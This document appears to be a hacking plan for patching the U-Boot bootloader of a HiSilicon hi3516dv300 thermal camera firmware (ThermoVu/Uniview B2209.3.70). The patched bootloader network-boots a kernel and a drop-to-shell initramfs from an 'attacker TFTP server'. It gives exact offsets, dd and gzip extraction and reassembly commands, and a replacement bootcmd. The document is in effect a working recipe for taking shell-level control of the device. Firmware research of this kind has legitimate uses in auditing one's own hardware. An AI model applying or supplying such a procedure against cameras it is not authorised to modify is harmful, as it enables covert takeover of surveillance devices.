Net-boot U-Boot patch plan (HiSilicon hi3516dv300, ThermoVu/Uniview B2209.3.70)

Goal: Alter default U-Boot env to boot a kernel+initramfs from TFTP over LAN first, then fall back to the existing MMC kernel so the device stays recoverable.

Targets and offsets
- Source: FromDigitalAlly/QPTS-B2209.3.70.CEN001.200707.zip
- Gzip-compressed U-Boot payload begins at offset 0x5B20 in u-boot.bin.orig; decompress length ~557,416 bytes.
- Default env in decompressed image contains:
  - bootcmd=mmc read 0 82000000 8800 8000;bootm 0x82000000
  - bootargs=mem=512M logosize=5M console=ttyAMA0,115200 ...

Planned env changes
- Set bootdelay=3 (or higher) to allow interruption if UART becomes available later.
- Set serverip=<attacker TFTP server>, ipaddr=192.168.30.178 (or rely on DHCP).
- Replace bootcmd with TFTP-first + MMC fallback:
  bootcmd=dhcp; tftp 0x82000000 uImage; tftp 0x83000000 initramfs.cpio.gz; bootm 0x82000000 0x83000000 || mmc read 0 82000000 8800 8000; bootm 0x82000000
  (Adjust load addresses for your kernel/initramfs if needed.)
- Optionally append init=/bin/sh to bootargs in your TFTP-served kernel/initramfs; avoid bloating bootargs in U-Boot if space is tight.

Patch procedure
1) Extract U-Boot:
   dd if=u-boot.bin.orig bs=1 skip=23328 of=u-boot.bin.gz
   gunzip u-boot.bin.gz  # yields u-boot.dec (~557 KB)
2) Edit env in u-boot.dec:
   - Locate the ASCII strings above.
   - Replace bootcmd string with the TFTP-first command (ensure length <= original; pad with null bytes if shorter).
   - If needed, insert ipaddr=... and serverip=... entries; keep total env block size unchanged.
3) Recompress:
   gzip -c u-boot.dec > u-boot.bin.gz
   (Ensure compressed size <= original gzip segment; if larger, reduce command length.)
4) Reassemble u-boot.bin:
   - Start from u-boot.bin.orig.
   - Overwrite bytes starting at offset 23328 (0x5B20) with u-boot.bin.gz.
   - Preserve total file size (fill any remainder with original padding if gzip shrank).
5) Sanity checks:
   - binwalk u-boot.bin (gzip offset intact).
   - strings u-boot.dec (confirm bootcmd/ipaddr/serverip).
   - Record SHA256 of patched u-boot.bin for tracking.

Network boot requirements
- TFTP server at serverip, reachable from device boot network.
- Files served: uImage (ARM kernel for hi3516dv300) at TFTP root, initramfs.cpio.gz with drop-to-shell.
- DHCP/BOOTP available, or static ipaddr pre-set in env; ensure serverip is set if DHCP does not supply it.

Risk/rollback
- Bad U-Boot flash will brick the unit; use sacrificial hardware or verified flashing method.
- TFTP unreachability will trigger fallback MMC boot if the command string includes “|| mmc read …”.
- No USB gadget/UMS/fastboot present; Ethernet is the only headless path without UART.
